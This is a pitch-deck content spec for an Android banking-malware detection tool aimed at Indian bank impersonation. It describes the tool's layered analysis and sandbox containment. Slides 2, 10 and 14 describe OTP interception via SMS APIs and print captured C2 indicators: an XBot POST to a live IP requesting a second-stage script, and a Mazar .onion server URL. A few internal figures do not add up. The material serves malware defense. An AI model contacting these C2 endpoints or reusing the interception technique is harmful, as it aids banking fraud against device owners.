# APK Sentinel — Pitch Deck Content & Build Spec

*For Claude Design + Canva plugin. Template/visual theme already chosen — this
file supplies **content only**: per-slide headline, a detailed body (this
version is written to be read from directly while presenting — it carries the
real technical mechanics, numbers, and code specifics, not just trimmed
headline bullets), a visual suggestion, and a speaker note for pacing/emphasis.
Where a slide's body has more lines than a template's default text box, either
shrink type slightly or let the presenter selectively read a subset live —
everything here is accurate and citable, so cutting for space never means
cutting something wrong.*

**Deck length:** 17 slides, ~13–16 min spoken at full technical depth (trim to
~10–12 by skipping the smaller sub-bullets on slides 6, 9, 11 if time is
tight). **Required sections present:** Novelty (slides 7–8), Technical
Feasibility (9–10), Model Explainability (11), Scalability (12) — each
explicitly labeled so a judge can find it instantly. UI Design is folded into
slide 13 (live demo) since it's best shown, not told. Competitive positioning
— both the technical differentiation *and* the product/market case — gets its
own slide (3).

---

## Slide map (quick reference)

| # | Slide | Section |
|---|---|---|
| 1 | Title | — |
| 2 | The Problem | Context |
| 3 | **Competitive Landscape** — Why Existing Tools Fall Short | Context / Novelty |
| 4 | The Pitch | Context |
| 5 | Architecture — the Evidence Spine | Context |
| 6 | Architecture — Seven Layers, In Depth | Context |
| 7 | **Novelty** — What's Actually New | **Novelty** |
| 8 | **Novelty** — Anti-Hallucination AI | **Novelty** |
| 9 | **Technical Feasibility** — It Runs Today | **Technical Feasibility** |
| 10 | **Technical Feasibility** — Live Capture | **Technical Feasibility** |
| 11 | **Model Explainability** — Every Point Traces to Evidence | **Model Explainability** |
| 12 | **Scalability** — As a Product, Not Just a Pipeline | **Scalability** |
| 13 | Live Demo / UI Walkthrough | UI Design |
| 14 | Real Catch: Mazar's Hidden C2 | Proof point |
| 15 | What's Next | Roadmap |
| 16 | Recap | Close |
| 17 | Thank You / Q&A | Close |

---

## Slide 1 — Title

**Headline:** APK Sentinel

**Subhead:** Evidence-driven detection of banking-malware apps impersonating
Indian banks & UPI services

**Body:** Team name · event name · date

**Visual:** App/shield icon mark, dark-to-light gradient background (or match
template default). Keep clean — no diagram on the title slide.

**Speaker note:** Open with the tagline, not the acronym soup. "We built a
system that doesn't just say an app is malicious — it shows you the exact
evidence."

---

## Slide 2 — The Problem

**Headline:** Fake banking apps are a fraud vector, not just a security bug

**Body:**
- Fraudulent APKs impersonate SBI, HDFC, ICICI, UPI apps, and government
  services (Aarogya Setu, Income Tax) to steal OTPs, UPI PINs, and credentials.
  A typical mechanism: an SMS-interceptor reads an incoming OTP via
  `SmsMessage.createFromPdu` → `getMessageBody()`, then forwards it to an
  attacker-controlled number with `SmsManager.sendTextMessage()` — the app
  never needs to *ask* for the OTP, it just reads it off the device.
- Existing scanners (VirusTotal, MobSF) answer **"is this app insecure?"** —
  hardcoded secrets, weak crypto, exported components — not **"is this app
  pretending to be my bank?"** Insecurity and impersonation are different
  questions with different evidence.
- Verdicts from most tools are a black-box score — "35/70 engines flag this,"
  with no reconstructable reasoning — nothing an analyst, a bank's compliance
  team, or CERT-In can act on with confidence or defend in an audit.
- Concretely measured in this project's own corpus: 12 India-targeted samples
  found (4 hand-picked, **8 more discovered by the pipeline itself** while
  scanning a general malware corpus), across three impersonated entities: SBI
  ("SBI Quick Support"), Aarogya Setu (4 samples), and an ICICI namespace-squat
  (`direct.uujgiq.imobile` claiming the `imobile` brand token without holding
  ICICI's real package).

**Visual:** A simple two-column icon comparison: a real bank app icon vs. a
near-identical fake, with a "?" between them. Or a stat callout: "Banking
trojans impersonating Indian institutions — a growing, underserved threat
class."

**Speaker note:** Ground the problem in the *fraud mechanism* (SMS/OTP theft
via impersonation), not generic "malware exists" — that's the differentiation
that carries through the whole deck, and into the competitive-landscape slide
right after this one.

---

## Slide 3 — COMPETITIVE LANDSCAPE: Why Existing Tools Fall Short

**Section label:** COMPETITIVE LANDSCAPE

**Headline:** Every existing option answers the wrong question, or answers it
as a black box

**Body (comparison table plus the underlying reason for each gap):**

| Tool / approach | What it does | Where it falls short |
|---|---|---|
| **MobSF** | Static scan for insecure code patterns — hardcoded secrets, weak crypto, exported components | Answers a developer's question, not a fraud analyst's. No brand-token matching, no signer-anomaly correlation, no concept of "this app claims to be a specific bank" |
| **VirusTotal** | Aggregates ~70 AV engine verdicts by file hash | A black box: "35/70 flag it" with zero reconstructable reasoning. Useless on a brand-new sample no engine has scored yet — pure reputation, no analysis |
| **Commercial AV/EDR** | Signature + heuristic detection | Verdict-only, closed-source detection logic, not tuned to Indian BFSI namespace patterns (UPI handles, `com.sbi.*`/`com.hdfcbank.*`-style prefixes) |
| **Pure ML classifiers (academic)** | A trained model outputs a probability from extracted features | One opaque number. Provably prone to learning shortcuts — our own L3 model hit exactly this failure (see slide 9): near-perfect AUROC that turned out to be measuring dataset source, not malice, until the feature set was deliberately restricted |

**Our four concrete differentiators (not marketing claims — each traces to a
design decision made *because* the naive version failed measurably):**
1. **Impersonation-first.** L0's whole-token brand matching against a
   hand-curated 40-entity whitelist — built this way after an early
   fuzzy-match version scored the benign note-taking app "duckAssist" at 0.706
   similarity to the Income Tax app's alt-label "iAssist" and raised a
   **critical false positive on an innocent app**. Whole-token matching
   (`duckAssist` → `{duck, assist}`, which cannot hit `iassist`) fixed it
   structurally, not by tuning a threshold.
2. **Every number is auditable.** `L5/l5.py --explain` prints the literal
   contribution chain: signal name → weight → evidence ID → finding. A judge
   or bank auditor can click from "score 88" down to "rule X fired on file Y."
3. **The AI cannot fabricate evidence.** Every LLM claim that a computer can
   check — a decoded string, a renamed identifier, an API call, an IOC — is
   independently re-derived in code before being kept. Claims that fail are
   **dropped, not down-weighted**, and the drop is recorded.
4. **The system refuses to overclaim.** When statistical support for the
   scoring weights is too thin (measured: at only 4 benign apps, 32 of 45
   signals priced as evidence of being *benign*, including the core brand-claim
   differentiator at −1.90), L5 stamps its own output `unsupported` rather than
   emitting a confident-looking number anyway.

**Product framing (say this out loud, don't just read the table):**
- None of these tools are *replaceable* by us wholesale — they solve adjacent
  problems well. The gap is specifically: **brand-impersonation fraud
  detection with an audit trail a bank's compliance/legal team can defend.**
- That gap is also the **market**: PSU banks, CERT-In, RBI-regulated NBFCs,
  and UPI TPAPs all need a defensible "why did you flag this" answer before
  they can act on a takedown or a fraud alert — a raw AV score or an ML
  probability doesn't clear that bar today.

**Visual:** The 4-row table above as the main visual; a small callout box
beside it: *"Our gap: impersonation-first + auditable, not just another
antivirus verdict."*

**Speaker note:** This slide does double duty — it's the technical Novelty
argument (nobody else asks the impersonation question) *and* the product
argument (that gap is a real, named buyer with a real, named need). Land both
in one breath if time is short; use the duckAssist anecdote if a judge asks
"how do you avoid false positives?"

---

## Slide 4 — The Pitch

**Headline:** One evidence-backed verdict, not a black-box score

**Body (big-quote style, one line):**
*"This app is 92% likely to be a banking trojan impersonating SBI — and here
is the exact code and network traffic that proves it."*

**Sub-bullets (small, under the quote):**
- Seven-layer pipeline (L0–L6) · every layer writes to one shared evidence
  record, keyed by the sample's SHA-256 hash
- Static analysis (decompile + rule-scan) + live detonation in an isolated
  emulator + a bounded ML prior + mechanically-verified AI reasoning + an
  auditable additive score — five independent kinds of evidence, none of which
  can silently override another

**Visual:** Large pull-quote treatment (this is the "hero" slide — biggest
type on the deck after the title).

**Speaker note:** This is the one sentence a judge should remember if they
remember nothing else.

---

## Slide 5 — Architecture: the Evidence Spine

**Headline:** Every layer writes to one shared, auditable record

**Body:**
- One record per app: `artifacts/<sha256>/evidence.json`. SHA-256 is the
  **primary key of the entire evidence model** — it's what lets L5 know which
  L1 findings belong with which L0 identity (they share a hash), it gives
  automatic dedup (two copies of the same malware under different filenames
  hash identically, so we analyse once), and it's tamper-evident (change one
  byte, the hash changes, so an evidence record can never silently attach to
  a modified file).
- The spine has exactly **one writer function**: `spine.py::update_layer()`.
  It merges *only its own layer's* block into the record and writes atomically
  (write-to-temp, then rename) — a crash mid-write can never leave a
  half-written file, and no layer can accidentally clobber another layer's
  findings.
- Every finding gets a **stable ID** (`F001`, `F002`, …) the first time it's
  written. Later layers *cite* that ID rather than re-asserting the fact —
  this is what makes the L5 score's audit trail possible at all.
- `LayerStatus` is an explicit enum (`not_attempted` / `running` / `complete`
  / `partial` / `failed` / `skipped`) — never a bare boolean. This matters:
  collapsing "never ran" and "ran, found nothing" into the same state would
  let a failed detonation silently read as a clean app.

**Visual:** A simple diagram — a vertical spine/column with 7 layer blocks
attached to it left-to-right or top-to-bottom, each feeding into the same
central record icon (file/database symbol). This is the one diagram worth
getting right — it's referenced again in slide 11.

**Speaker note:** "Auditability" is the word to land here — it's the thread
that ties Novelty, Feasibility, and Explainability together later.

---

## Slide 6 — Architecture: Seven Layers, In Depth

**Headline:** L0 → L6 — triage to verdict, each layer's actual mechanism

**Body (one detailed line per layer — this is the slide to read from most
closely if a judge asks "how does layer X actually work"):**

| Layer | Mechanism |
|---|---|
| **L0 Triage** | Whole-token/phrase brand matching against a 40-entity hand-curated whitelist + perceptual-hash (pHash) icon comparison + signing-certificate anomaly classification (debug key / AOSP test key / self-signed-claiming-major-vendor) |
| **L1 Static** | jadx decompile (bundled JDK 17) → YARA rule scan in **three separate passes** (raw APK container, per-class dex buffers, per-file decompiled Java) — never concatenated, never whole-dex, for reasons measured the hard way (next slide) — plus Ghidra for native `.so` payloads |
| **L2 Dynamic** | Live detonation in a network-isolated Android emulator (`sentinel30`, KVM-accelerated), fail-closed iptables isolation verified by an actual failed ping test, Frida hooks on SMS/crypto APIs, mitmproxy containing unknown egress by default |
| **L3 ML** | LightGBM gradient-boosted trees over a hand-restricted, security-relevant token vocabulary (permissions, intents, sensitive API calls, capability aggregates) — isotonic-calibrated, group-disjoint evaluated, bounded to ±10 points, never a verdict |
| **L4 GenAI** | Three sequential LLM calls per flagged class (analyst → reasoning-trail → adversarial verifier), with every checkable claim independently re-derived in code before being kept — contributes zero points by default |
| **L5 Scoring** | Additive log-odds accumulation with Jeffreys-smoothed, corpus-measured weights, geometric within-family discounting, a fitted sigmoid mapping to 0–100, and "smoking-gun" gates that can only raise a score to a floor, never override it |
| **L6 Output** | Self-contained air-gapped HTML report, FastAPI live control panel with a real-time streaming feed and emulator view, STIX 2.1/CSV/YARA/Sigma export |

**Visual:** A horizontal pipeline diagram, 7 icons left to right, each with
its one-line label underneath. Keep icons simple (magnifying glass, gear,
phone/sandbox, chart, brain/chat bubble, scale/balance, monitor).

**Speaker note:** This slide is denser than the rest on purpose — it's the
one to have open if a judge interrupts with "wait, how exactly does L1
avoid false positives from batching files together?" (answer's on the next
slide) or similar layer-specific questions.

---

## Slide 7 — NOVELTY: What's Actually New

**Section label (visually distinct, e.g. colored tag):** NOVELTY

**Headline:** Not another "is this app risky" scanner

**Body (4 detailed points):**
- **Bank-impersonation-first.** The headline question is "is this pretending
  to be a specific Indian bank/UPI/gov app?" — answered by whole-token brand
  matching correlated with signing-certificate anomalies. Severity escalates
  to Critical specifically when *both* fire together ("claims to be SBI *and*
  is signed with a debug key"), not from either alone.
- **Mechanically-verified AI reasoning.** Every LLM claim that a computer can
  check is re-derived independently: decoded strings re-decoded via
  `base64`/`base32`/hex/gzip, renamed identifiers checked for a word-boundary
  match in the actual code, API calls verified present, IOCs accepted only if
  a deterministic layer already extracted them first. A claim that fails this
  check is dropped, never down-weighted.
- **Auditable additive scoring.** The final 0–100 score is a literal sum of
  named, weighted, evidence-cited contributions — computed with a formula
  (Jeffreys-smoothed log-odds ratio, shown on slide 11) from real corpus
  counts, not hand-tuned.
- **India-specific threat modeling.** UPI ID pattern matching, Indian mobile
  number formats, and namespace-squat detection tuned to how real India-
  targeted samples actually present (e.g. `direct.uujgiq.imobile` squatting
  ICICI's `imobile` brand token without holding the real package).

**Visual:** 4-quadrant or 4-icon grid, one per bullet. Keep icons distinct
(shield-with-check, brain-with-checkmark, balance-scale, India-outline or
flag accent).

**Speaker note:** This is a 30-point section — don't rush it, but don't read
the bullets verbatim either. Pick the AI-verification bullet to expand on
verbally; it carries into slide 8.

---

## Slide 8 — NOVELTY: Anti-Hallucination AI

**Section label:** NOVELTY (continued)

**Headline:** We caught our own AI lying — then built a system that can't

**Body (the full worked example, narrated in order):**
1. During model selection, a candidate model (`north-mini-code`) was asked to
   decode the base64 string `aHR0cDovLzE5Mi4xNjguMS4xMDAvZ2F0ZS5waHA=`. It
   confidently answered `.../get.php`.
2. The true decoded value — one line of Python, `base64.b64decode(...)` —
   is `.../gate.php`. Fluent, plausible, exactly the shape of a real finding,
   and **wrong**. No amount of prompting or a "smarter model" reliably catches
   this class of error; only mechanical re-checking does, every time, for free.
3. So `L4/verify.py` now independently re-derives every checkable claim before
   it's kept: `decoded_strings` are re-decoded and compared byte-for-byte;
   `renamed` identifiers must actually occur in the code (word-boundary
   regex); `api_calls` must actually occur; `iocs` must **already be in L1's
   extracted indicator list** — the model is never allowed to introduce a new
   one. Free-text `behaviours` claims have no mechanical check, so they're
   carried as `unverified`, never asserted as fact.
4. A **second, adversarial LLM pass** (`verify_verdict.py`) then re-reads the
   source code against the reasoning trail the first pass built, actively
   trying to find a flaw — a benign alternative explanation, a stretched or
   fabricated citation. Even this verifier isn't trusted blindly: every
   knowledge-base citation it accepts is cross-checked in code against what
   was actually retrieved, and a fabricated citation can only push the verdict
   *down* (toward "weakened"/"refuted"), never up — mirroring how a failed
   mechanical check in step 3 is always final, never overridden by a later
   pass's confidence.

**Callout stat:** *Claims that fail verification are **dropped, not
down-weighted** — and the drop is recorded in the audit trail for review.*

**Visual:** A simple before/after: a crossed-out "get.php" next to a
checkmarked "gate.php", or a 4-step mini-flowchart (Analyst claim →
Mechanical re-derivation → Adversarial re-check → Kept / Dropped).

**Speaker note:** This is the single best "aha" moment in the deck — a real
measured failure that justifies the entire design. Slow down here.

---

## Slide 9 — TECHNICAL FEASIBILITY: It Runs Today

**Section label:** TECHNICAL FEASIBILITY

**Headline:** Not a mockup — a working pipeline, measured end to end

**Body (stat-grid, big numbers, each with the specific claim behind it):**
- **440** automated tests passing (full suite, `pytest tests/ -q`)
- **3,664** samples with a computed evidence spine
- **3,090 malware / 604 benign** corpus composition (malware: our GitHub
  malware corpus + CICMalDroid banking-labelled samples; benign: F-Droid)
- **37%** malware-category detection rate, up from a **measured 8% baseline**
  — the fix was tracing a YARA endianness bug (`uint32` is little-endian in
  YARA, so 27 of 43 rules gated on `uint32(0)==0x504B0304` were silently
  *never true*) combined with fixing rules gated on ZIP-container magic bytes
  that could structurally never match a `.dex` file (which starts with
  `dex\n035`, not `PK`) — removing that gate alone took detection 8% → 37%
- **0.9229** L5 hybrid-score AUROC (95% CI 0.9085–0.9362), on 640 malware vs.
  604 benign — measured honestly, with the CI reported, not just a point
  estimate

**Honesty callout (say this explicitly — it's a credibility move, not a
weakness):** the L3 ML submodel's own held-out AUROC is **0.9963** — flagged
in the model's own metrics file as a likely **source-confound artifact**, not
real skill, because benign=F-Droid and malware=CICMalDroid are disjoint
sources with different packaging conventions. AUROC ≥ 0.99 is treated as a
leakage warning throughout this project, in our own results as much as in
anyone else's claims.

**Visual:** 4-5 large stat callouts in a grid (classic "by the numbers" layout
— use the template's stat/KPI component if it has one), with the honesty
callout set apart visually (different color/icon) from the main stat grid.

**Speaker note:** These are measured numbers, not estimates — worth saying
"measured" out loud once here to set the tone for the rest of the section.
The honesty callout is a deliberate credibility move: naming your own
model's biggest weakness before a judge finds it is more persuasive than
hiding it.

---

## Slide 10 — TECHNICAL FEASIBILITY: Live Capture

**Section label:** TECHNICAL FEASIBILITY (continued)

**Headline:** Real malware, live-detonated, safely contained

**Body:**
- Isolated Android emulator (`sentinel30`, Android 30 Google-APIs x86_64,
  KVM-accelerated), network locked down at the guest `iptables` level:
  loopback + host subnet only allowed, ports 80/443 DNATed to our proxy,
  **everything else dropped** — then **positively verified**, not assumed: a
  ping to `8.8.8.8` must fail, and the proxy must be reachable, before
  detonation is allowed to proceed. Fail-closed by construction.
- Live-detonated the **XBot** banking trojan (`org.merry.core`) — it has a
  `BOOT_COMPLETED` receiver, so it beacons its C2 on launch with no UI
  interaction needed. Captured its real C2 POST requesting a second-stage
  script.
- The mitmproxy containment layer **blocked it** by default — logged with
  `blocked: true`, never forwarded to the real internet. (An earlier version
  of this layer only *observed* traffic and would have let this leak out —
  fixed before this capture.)
- Native-code analysis (**Ghidra**) is now fully integrated alongside jadx —
  installed, verified end-to-end on a real sample with a hidden native
  library, correctly identifying JNI native methods and extracting real
  strings from the compiled binary. Samples with a native `.so` payload get
  the same forensic depth as pure-Java ones now, not a documented gap.
- AI cost is kept low with **two-tier model routing**: a cheap model handles
  generation-only steps (claim extraction, reasoning-trail structuring), and
  a stronger model (GLM 5.3 Flash) is reserved specifically for the
  adversarial verification step and live UI navigation decisions — the two
  places where reasoning quality actually matters and call volume is
  naturally lowest (one call per class or per navigation step, not per
  retry). This specific model was chosen after a live safety test: it
  correctly avoided confirming a destructive "uninstall this app?" dialog
  where two other candidate models did not — reasoning quality on that exact
  test was the deciding factor, not just cost.
- **Beyond the score: a post-verdict recommendation step** now tells the
  analyst what to actually do next — not a trained model, the same RAG +
  mechanical-verification discipline as the AI reasoning layer, grounded in
  a real sourced SOP knowledge base (MITRE ATT&CK Mitigations, CERT-In's
  6-hour reporting mandate, RBI's fraud-response duties, NIST SP 800-61).
  Measured live against XBot's own scored report: correctly proposed
  escalation and named the real captured C2 IP for blocking, for **$0.037**.

**Callout (monospace, code-block style for authenticity — this is the exact
decoded payload, keep it verbatim):**
```
POST http://192.227.137.154/request.php
{"name": "bootScriptNet", "action": "get_script"}   →  BLOCKED
```

**Visual:** The code-block callout above as a visual element (styled like a
terminal/log snippet) — this reads as "real," which is the point.

**Speaker note:** If there's time for one live demo moment in the talk, this
is it — it's the most concrete "this actually works" proof in the deck.

---

## Slide 11 — MODEL EXPLAINABILITY: Every Point Traces to Evidence

**Section label:** MODEL EXPLAINABILITY

**Headline:** Ask "why" and get a real answer, not a probability

**Body:**
- The final score is a **literal sum of named, evidence-linked contributions**
  — not a single opaque model output. `L5/l5.py --explain` prints the full
  chain: each signal, its weight, the evidence ID(s) behind it, any
  within-family redundancy discount applied, and which constraint (if any)
  was binding.
- **Weights are computed, not hand-set.** Each is a Jeffreys-smoothed
  log-odds ratio: `weight = log((m+0.5)/(M−m+0.5)) − log((b+0.5)/(B−b+0.5))`,
  where `m,M` are malware hits/total and `b,B` are benign hits/total. In
  plain terms: a signal that fires much more often on malware than benign
  earns a large positive weight; one that fires equally on both earns ~zero.
  The "+0.5" smoothing keeps the arithmetic sane when a count is zero, and
  every weight carries a **support stamp** — a measure of how many benign
  observations back it, so a weight computed from too few samples is flagged
  rather than trusted blindly.
- Every AI claim is labeled **verified** or **unverified**, with a specific
  reason recorded when dropped — never silently discarded.
- **Confidence is a separate, visible axis** from the score itself.
  `L5/confidence.py` computes it independently — a failed detonation, a
  partial decompile, or unsupported weights reduce *confidence*, not the
  score, so the system can honestly say "score 88, but confidence low because
  we couldn't detonate it" instead of quietly folding uncertainty into one
  number.
- "Smoking-gun" gates use **ternary evaluation** (`fired` / `not_fired` /
  `indeterminate`) specifically so a failed analysis (e.g. jadx never
  produced a file) reads as *indeterminate*, never as `false` — because a
  failed analysis silently reading as "clean" is a worse failure mode than
  an honest "we don't know."

**Visual:** Reuse the evidence-spine diagram from slide 5, but now with
example annotations pointing off of it: *"+3.0 → yara:SMS_Suppression
(F004)"*, *"+2.5 → l0:brand_claim (F001)"* — showing the actual audit trail
concept visually.

**Speaker note:** Contrast directly with a black-box classifier here —
"most ML security tools give you a number; we give you the receipt." If a
judge asks for the weight formula, it's on this slide — read it verbatim,
it's a real formula, not a marketing simplification.

---

## Slide 12 — SCALABILITY: As a Product, Not Just a Pipeline

**Section label:** SCALABILITY

**Headline:** Built to grow technically — and to fit how a bank or CERT-In
would actually deploy it

**Body, three columns (this slide carries the product case, not just
throughput):**

*Scales technically:*
- Resumable, content-addressed corpus runner — **705 samples in ~57 minutes**,
  measured, disk flat throughout (decompiled jadx output — the heaviest
  writer, ~112 MB per sample vs. a ~2 MB APK — is reclaimed per sample)
- Every layer is independently skippable per run: a static-only pass (L0+L1)
  completes in seconds; full forensic depth (through live detonation and AI
  reasoning) is available on demand for a specific sample
- CPU-only ML (LightGBM — no GPU dependency), no external vector database for
  retrieval (TF-IDF, entirely local), disk reclaimed per sample, every AI call
  runs under a hard budget cap that refuses rather than silently overspends

*Fits how the buyer deploys:*
- **On-prem capable by design** — local threat cache, self-contained HTML
  reports, no mandatory cloud dependency, no external vector DB to stand up.
  This matters commercially: a bank's compliance/security team frequently
  *cannot* send app samples to a third-party cloud, which rules out a
  pure-SaaS competitor outright for their most sensitive use case
- Cloud/SaaS deployment is equally possible for a CERT-In-style shared
  threat-intel service ingesting reports from many banks at once — same
  pipeline, different deployment shape, because nothing in the design assumes
  cloud-only or on-prem-only
- Per-layer skip means the *same tool* serves two very different buyers: a
  fast triage pass for a high-volume app-store scanner, and a full forensic
  run for an incident-response team — without maintaining two separate
  products or codebases

*Honest current limits (say these plainly — it reads as credibility, not
weakness):*
- One emulator instance today for live detonation (architecturally
  parallelizable via multiple AVD instances/snapshots, not yet parallelized)
  — the throughput ceiling is specifically on the *dynamic* layer, not the
  pipeline as a whole
- Some rule weights are provisional until the benign corpus grows further
  (the closed-form requirement, derived from the Jeffreys bound, is **B ≥
  213** benign apps before the core brand-claim differentiator can even earn
  a positive weight) — and the system **says so explicitly** via the
  `unsupported` stamp rather than overclaiming confidence
- The benign corpus (F-Droid) currently has **zero commercial banking apps**
  — a named, tracked gap, not a blind spot; the roadmap (slide 15) addresses
  it directly with a hard-negative panel

**Why this is a competitive moat, not just an engineering property:** the
audit trail (slide 11) is exactly what a regulated buyer needs to *act* on a
flag — take an app down, file a fraud report, brief a regulator — in a way a
black-box AV score cannot support. Explainability is the feature that makes
this sellable into BFSI/CERT-In workflows specifically, not a generic
nice-to-have.

**Visual:** Three-column layout — checkmarks for "scales technically," a
neutral deployment-icon column for "fits the buyer," and a neutral info-icon
(not a warning icon) for "honest limits," framing limits as transparency, not
weakness.

**Speaker note:** Judges respect honesty about limits far more than a claim
of "infinitely scalable" — say the limits plainly, but don't let the slide
end there; the deployment-fit column is what makes this read as a product
pitch, not just a systems-scalability slide.

---

## Slide 13 — Live Demo / UI Walkthrough

**Headline:** One dashboard: pick an app, run it, watch it live

**Body (numbered walkthrough, matches a live demo or screenshot sequence):**
1. Pick a sample, choose which layers to run (skip the emulator for a
   fast static-only pass, or run the full L0–L6 chain including live
   detonation and AI reasoning)
2. Watch a **live streaming feed** of every pipeline stage as it happens —
   real subprocess output captured line-by-line, not a spinner or a fake
   progress bar
3. Watch the **live emulator screen** and the AI navigator's actions in
   real time — each perceive-reason-act step is logged with its reasoning
4. **Stop mid-run** safely at any point — cleanup (network isolation
   teardown, process termination) still runs correctly, nothing is left in a
   broken or unsafe state
5. Get the verdict, the full evidence breakdown with clickable audit trail,
   and one-click **STIX 2.1 / CSV / YARA / Sigma** export for feeding
   straight into a SIEM or threat-intel platform
6. Toggle **AI-on/AI-off** to compare the score with and without L4's
   optional contribution — makes the "LLM contributes zero points by
   default" design concrete and visible, not just a claim

**Visual:** Screenshot of the actual dashboard (light theme, verdict panel +
live sandbox panel visible) — **use a real screenshot here**, not a mockup,
if one is available before the deck is finalized.

**Speaker note:** If doing a live demo instead of screenshots, this is the
slide to demo live against — keep the walkthrough steps as your on-screen
checklist.

---

## Slide 14 — Real Catch: Mazar's Hidden C2

**Headline:** Found what a normal scanner would miss

**Body:**
- The **Mazar BOT** banking trojan's real C2 address wasn't in its code at
  all — it was hidden inside a **compiled Android string resource**
  (`res/values/strings.xml`, field name `server_url`), which is stored in the
  binary `resources.arsc` table, not as readable source
- Most static scanners only look at decompiled code and text files — this
  indicator was invisible to a code-only scan, since the compiled resource
  table is a different, binary file format entirely
- The extraction pipeline was extended to also scan `resources.arsc` as an
  "interesting" file (previously only `.dex` and specific text extensions
  were scanned) — the address surfaced immediately once that gap was closed,
  along with adding `.onion` to the recognized indicator TLD patterns

**Callout:**
```
<string name="server_url">http://pc35hiptpcwqezgs.onion</string>
```

**Visual:** The XML snippet above as a styled code-block callout, maybe with
a magnifying-glass icon emphasizing "hidden, then found."

**Speaker note:** This is a second concrete proof point (after slide 10) —
use it if there's time; cut it first if the deck runs long, since slide 10
already carries the "real capture" moment.

---

## Slide 15 — What's Next

**Headline:** Where this goes from here

**Body (forward-looking, confident not apologetic, each item traceable to a
named gap already identified in this deck):**
- **Hard-negative benign panel**: grow the benign corpus with real commercial
  Indian banking/UPI/fintech apps (SBI, HDFC, ICICI, Paytm, PhonePe, and
  others), not just open-source F-Droid apps — directly closing the gap named
  on slide 12, since the current benign set has zero commercial banking apps
  to stress-test false positives against
- Cross the **B ≥ 213** benign-sample threshold broadly enough that every
  currently-provisional rule weight matures out of `unsupported` status
- Parallelize live detonation across multiple emulator instances — removes
  the one named throughput ceiling from slide 12
- Expand the India-specific indicator set (more banks, more UPI handles, more
  namespace-squat patterns as they're observed in the wild)
- Explore a CERT-In-facing shared reporting mode — one deployment, many banks
  contributing and querying threat intelligence collaboratively

**Visual:** Simple forward-arrow or roadmap icon row, 3–5 milestones.

**Speaker note:** Keep this slide short even though the body above is
detailed — a roadmap slide that runs long kills momentum right before the
close. Note that native-code analysis (Ghidra) has *moved out* of this slide
since an earlier version of this deck — it's live now, not a future item
(see slide 10).

---

## Slide 16 — Recap

**Headline:** What we built, in one breath

**Body (5 lines, one per required section plus the product case, deliberately
mirroring slides 3 and 7–12 so it reads as a summary, not new content):**
- **Novel**: bank-impersonation-first detection (whole-token brand matching +
  signer-anomaly correlation) + mechanically-verified AI reasoning (every
  checkable claim re-derived in code, dropped if it fails)
- **Feasible**: 440 tests passing, a real live malware sample (XBot) captured
  and contained end to end, 0.9229 measured AUROC with its confidence
  interval reported honestly
- **Explainable**: every score point traces to a named signal, a computed
  weight, and a specific evidence ID — auditable line by line, not a
  black-box number
- **Scalable**: hundreds of samples per corpus run, deployable on-prem or as
  a shared service, honest about today's specific limits (one emulator
  instance, a growing benign corpus)
- **Competitive**: the one tool that answers "is this pretending to be my
  bank," and can defend the answer with a citable audit trail — not just
  another antivirus verdict

**Visual:** Match slide 4's pull-quote styling for consistency — this is the
bookend to the pitch slide.

**Speaker note:** Say each line, pause half a beat between them — this is
the "if you only heard 20 seconds" summary.

---

## Slide 17 — Thank You / Q&A

**Headline:** Thank you

**Body:** Team names · contact/repo link if sharing one · "Questions?"

**Visual:** Match slide 1's styling — bookend the deck visually.

**Speaker note:** Stop talking. Let the question come. If a technical
follow-up goes deeper than any slide covers, the source of truth is
`docs/PROJECT_AND_PIPELINE_GUIDE.md` in the repo — it has full mechanism
detail for every layer, the exact code files, and every number's provenance.

---

## Notes for whoever builds this in Claude Design

- **This version is written for a presenter reading from the slide**, not a
  minimal-text template — every body section carries real technical mechanics,
  formulas, and numbers rather than trimmed headline bullets. If the chosen
  template's text boxes are too small for a slide's full body, either shrink
  type, split a dense slide (9, 11, or 12 are the densest) across two slides,
  or keep the full text in speaker notes and show only the sub-headers/stat
  callouts on-screen — but don't cut technical content to fit a box; resize
  the box or split the slide instead.
- **Stat callouts (slides 9, 10, 14, 16)** are meant to be visually distinct
  from body bullets — use the template's KPI/stat/quote components where one
  exists, not another bullet list.
- **Code-block callouts** (slides 10, 14) should render in a monospace font
  even if the rest of the deck doesn't use one — it signals "this is a real
  captured artifact," which is the point.
- **Slide 5's spine diagram is reused conceptually in slide 11** — keep the
  visual language (the same "record" icon, the same layer-block shape)
  consistent between them so the callback lands.
- **Slide 3's competitive table and slide 12's scalability slide are the two
  "product" slides** — if a judge or mentor is scoring this partly as a
  viable product (not just a technical build), these two carry that weight;
  don't cut them for time before cutting slide 14 first.
- **The weight formula on slide 11 and the detection-rate numbers on slide 9
  are exact** (not rounded for effect) — read them verbatim if a judge asks
  to see the math; don't paraphrase them into "roughly."
- Full technical backing for every claim in this deck lives in
  `docs/PROJECT_AND_PIPELINE_GUIDE.md` in this repo (see especially Part 2,
  "Competitors, and where we are different," the per-layer deep-dive sections
  L0 through L6, and Part 4, "Mapping to the evaluation scheme") — pull from
  there if a judge asks a follow-up question this deck doesn't cover in full.

---

## Quick-reference fact sheet (for live Q&A — every number, one lookup)

*Everything below also appears on its slide in context; this table exists so
a specific number can be found in seconds during a live question, without
re-reading prose. Grouped by topic, not by slide, since a Q&A question rarely
comes phrased as "what does slide 9 say."*

**Corpus & testing**
| Fact | Value | Slide |
|---|---|---|
| Automated tests passing | 440 | 9 |
| Total scored samples (evidence spines) | 3,664 | 9 |
| Malware corpus size | 3,090 (GitHub malware corpus + CICMalDroid banking) | 9 |
| Benign corpus size | 604 (F-Droid) | 9 |
| Malware-category detection rate | 37%, up from measured 8% baseline | 9 |
| Full-corpus run time | 705 samples in ~57 minutes, disk flat | 12 |
| India-targeted samples in corpus | 12 (4 hand-picked + 8 pipeline-discovered) | 2 |

**Scoring & ML**
| Fact | Value | Slide |
|---|---|---|
| L5 hybrid-score AUROC | 0.9229 (95% CI 0.9085–0.9362), n=640 malware/604 benign | 9 |
| L3 ML submodel held-out AUROC | 0.9963 — flagged as likely source-confound, not real skill | 9 |
| Weight formula | `log((m+0.5)/(M−m+0.5)) − log((b+0.5)/(B−b+0.5))` (Jeffreys-smoothed log-odds) | 11 |
| Minimum benign sample count for a positive weight | B ≥ 213 (closed-form, derived from the Jeffreys bound) | 12 |
| L3's score contribution bound | ±10 points, never a verdict | 6, 12 |
| Critical-band score floor | 85 | 11 |

**Live capture (XBot)**
| Fact | Value | Slide |
|---|---|---|
| Package name | `org.merry.core` | 10 |
| C2 endpoint | `http://192.227.137.154/request.php` | 10 |
| Decoded C2 payload | `{"name": "bootScriptNet", "action": "get_script"}` | 10 |
